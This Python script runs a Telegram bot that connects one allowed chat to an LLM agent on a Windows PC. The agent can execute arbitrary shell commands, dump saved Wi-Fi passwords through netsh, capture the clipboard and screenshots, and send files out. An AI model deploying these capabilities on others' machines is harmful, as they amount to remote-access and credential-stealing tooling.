from telegram.ext import Application, MessageHandler, CommandHandler, filters
from langchain.agents import Tool
from langchain import hub
from langchain.agents import AgentExecutor, create_react_agent
from langchain_groq import ChatGroq
import subprocess
import re
import pyautogui
import os
import pytesseract
from PIL import Image
import psutil


import pyperclip

def get_clipboard_content(n):
    try:
        return pyperclip.paste()
    except Exception as e:
        return str(e)

# Define tool
clipboard_content_tool = Tool(
    name="Clipboard Content",
    func=get_clipboard_content,
    description="Fetches the current content of the clipboard and returns it."
)


def system_tasks(task):
    try:
        if task == "shutdown":
            subprocess.run(["shutdown", "/s", "/t", "0"])
            return "System is shutting down..."
        elif task == "restart":
            subprocess.run(["shutdown", "/r", "/t", "0"])
            return "System is restarting..."
        else:
            return "Unknown task."
    except Exception as e:
        return str(e)

# Define tool
system_task_tool = Tool(
    name="System Tasks",
    func=system_tasks,
    description="Performs system tasks like shutdown or restart."
)

def manage_process(action, process_name):
    try:
        if action == "kill":
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] == process_name:
                    proc.terminate()
                    return f"Process {process_name} terminated."
            return f"Process {process_name} not found."
        elif action == "start":
            subprocess.Popen([process_name])
            return f"Process {process_name} started."
        else:
            return "Invalid action. Use 'start' or 'kill'."
    except Exception as e:
        return str(e)

# Define tool
process_management_tool = Tool(
    name="Process Management",
    func=manage_process,
    description="Manages system processes (start, stop, or kill)."
)




# Take a screenshot and extract text
def screenshot_and_extract(n):
    print(n)
    try:
        # Take a screenshot
        screenshot_path = "screenshot.png"
        screenshot = pyautogui.screenshot(screenshot_path)

        # Perform OCR on the screenshot
        text = pytesseract.image_to_string(screenshot)

        if not text.strip():
            return "No text detected in the screenshot."
        
        return text.strip()
    except Exception as e:
        print(str(e))
        return str(e)

# Define the tool with the updated function
screenshot_ocr_tool = Tool(
    name="Screenshot and Extract Text",
    func=screenshot_and_extract,
    description="Takes a screenshot of the current screen and extracts text using OCR. and returns the text"
)

# Allowed chat ID
ALLOWED_CHAT_ID = 1059393984

# Define AI Bot Tools
def get_stored_wifi_passwords(n):
    profiles_data = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
    profiles = re.findall(r"All User Profile\s*:\s*(.*)", profiles_data.stdout)
    
    wifi_passwords = {}
    for profile in profiles:
        profile = profile.strip()
        profile_info = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], capture_output=True, text=True)
        password_match = re.search(r"Key Content\s*:\s*(.*)", profile_info.stdout)
        
        if password_match:
            wifi_passwords[profile] = password_match.group(1)
        else:
            wifi_passwords[profile] = None
    
    return wifi_passwords

def execute_shell_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            return result.stdout
        else:
            return result.stderr
    except Exception as e:
        return str(e)

# Define tool for AI to generate file path for Telegram bot to send
def sendfile(filelocation):
    # # Example: Here, we simply return the file path, but you can add logic to generate the file
    # file_path = os.path.join(os.getcwd(), file_name)
    # if os.path.exists(file_path):
    #     return file_path
    # else:
    print(filelocation)
    return filelocation

# AI Tool definition
shell_command_tool = Tool(
    name="Execute shell command",
    func=execute_shell_command,
    description="Executes the provided shell command and returns the result. You need to provide proper Windows commands as arguments."
)

get_stored_wifi_passwords_tool = Tool(
    name="get the wifi passwords of my machine",
    func=get_stored_wifi_passwords,
    description="helps to retive the forgotten wifi passwords in the machine. execute and returns wifi passwords"
)

# Define the tool for generating a file path for the Telegram bot
sendfile_tools = Tool(
    name="Send a file to the user - find a location using shell_command_tool and need file location as a absolute path, share the output with the user which its returning",
    func=sendfile,
    description="use to send the file to user, parse the filename as argument to this share the output which its returning. important include the filename also"
)

# Load ReAct prompt
prompt_react = hub.pull("hwchase17/react")

# Initialize ChatGroq model
model = ChatGroq(model_name="llama3-70b-8192", groq_api_key="api", temperature=0)

# Create ReAct agent
tools = [shell_command_tool, get_stored_wifi_passwords_tool, sendfile_tools,screenshot_ocr_tool,clipboard_content_tool]
react_agent = create_react_agent(model, tools=tools, prompt=prompt_react)
react_agent_executor = AgentExecutor(agent=react_agent, tools=tools, verbose=True, handle_parsing_errors=True)

# Telegram Bot: Command to send photo (screenshot)
async def send_photo(update, context) -> None:
    """Send a photo (screenshot) to the user."""
    if update.message.chat_id == ALLOWED_CHAT_ID:
        # Capture screenshot
        screenshot = pyautogui.screenshot()
        screenshot_path = "screenshot.png"
        screenshot.save(screenshot_path)
        
        # Send screenshot back to user
        caption = "Here's your screenshot!"
        await context.bot.send_photo(chat_id=update.effective_chat.id, photo=open(screenshot_path, 'rb'), caption=caption)
    else:
        await update.message.reply_text("Unauthorized access. You are not allowed to use this bot.")

# Telegram Bot: Handle user input for AI
async def handle_command(update, context):
    user_input = update.message.text
    chat_id = update.message.chat_id  # Get the chat ID

    if chat_id == ALLOWED_CHAT_ID:
        # Pass input to AI agent
        try:
            ai_output = react_agent_executor.invoke({"input": user_input})
            print(ai_output)
            response = ai_output['output']
        except Exception as e:
            response = f"Error: {str(e)}"
    else:
        response = "Unauthorized access. You are not allowed to use this bot."

    # Check if AI output contains a file path request
    if "\\" and ":" in response: 
        print(response) # Example: You can customize this logic
        file_path = response.split(" ")[-1]
        await send_file(update.message.chat_id, context, file_path)

    # Send the AI's response back to the user
    await context.bot.send_message(chat_id=chat_id, text=response)

# Command to manually trigger file sending through the Telegram bot
async def handle_send_file(update, context):
    if update.message.chat_id == ALLOWED_CHAT_ID:
        file_path = "example.txt"  # File to be sent (update this path as needed)
        await send_file(update.message.chat_id, context, file_path)
    else:
        await update.message.reply_text("Unauthorized access.")

# Helper function to send files via Telegram
async def send_file(chat_id, context, file_path):
    if os.path.exists(file_path):
        await context.bot.send_document(chat_id=chat_id, document=open(file_path, 'rb'), caption="Here is your file.")
    else:
        await context.bot.send_message(chat_id=chat_id, text="File not found.")

def main():
    app = Application.builder().token("<your:token").build()
    
    # Add command handler for sending screenshot
    app.add_handler(CommandHandler("screenshot", send_photo))
    
    # Add handler for AI commands
    app.add_handler(MessageHandler(filters.TEXT, handle_command))

    # Add command handler for manually sending files
    app.add_handler(CommandHandler("sendfile", handle_send_file))
    
    app.run_polling()

if __name__ == "__main__":
    main()
